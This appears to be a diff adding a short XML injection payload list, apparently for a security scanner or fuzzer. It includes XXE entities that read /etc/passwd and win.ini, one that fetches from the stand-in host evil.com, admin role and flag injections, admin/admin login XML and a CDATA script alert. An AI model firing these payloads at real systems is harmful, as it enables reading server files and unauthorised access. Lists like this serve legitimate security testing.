@@ -1,0 +1,13 @@
+<?xml version='1.0'?><root><test>DOMINATOR_XML_INJECTION</test></root>
+<test>xml_injection_test</test>
+<?xml version='1.0'?><user><name>admin</name><role>administrator</role></user>
+<![CDATA[<script>alert('XML_INJECTION')</script>]]>
+<?xml version='1.0'?><data><item>test</item></data>
+<root><admin>true</admin></root>
+<?xml version='1.0'?><login><user>admin</user><pass>admin</pass></login>
+<injection>XML_PAYLOAD_TEST</injection>
+<?xml version='1.0'?><config><debug>true</debug></config>
+<data><value>injected_xml_content</value></data>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/win.ini">]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]><root>&test;</root>
